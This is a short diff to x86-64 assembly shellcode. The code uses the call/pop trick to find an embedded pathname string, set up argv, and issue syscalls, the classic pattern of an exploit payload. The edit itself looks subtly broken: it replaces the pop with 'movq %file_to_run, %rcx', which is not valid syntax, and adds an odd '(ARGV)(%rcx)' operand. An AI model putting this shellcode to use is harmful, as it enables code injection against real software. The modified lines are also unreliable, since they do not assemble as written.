@@ -18,8 +18,8 @@ main:
 
 payload:
 
-        popq    %rcx
-        movq    %rcx, 8(%rcx)       /* set up argv pointer to pathname */
+        movq    %file_to_run, %rcx
+        movq    %rcx, (ARGV)(%rcx)       /* set up argv pointer to pathname */
 
         movq    $SYS_exit, %rax          /* syscall arg 1: SYS_exit (60) */
         xorq    %rdi,%rdi                /* syscall arg 2: 0 */
@@ -40,7 +40,9 @@ payload:
         syscall                          /* invoke syscall */
 
 callptr:
-    call    payload                    /* push STRING ptr to stack */
+    call    payload                      /* push STRING ptr to stack */
+
+file_to_run:
     .ascii  STRING
 
 
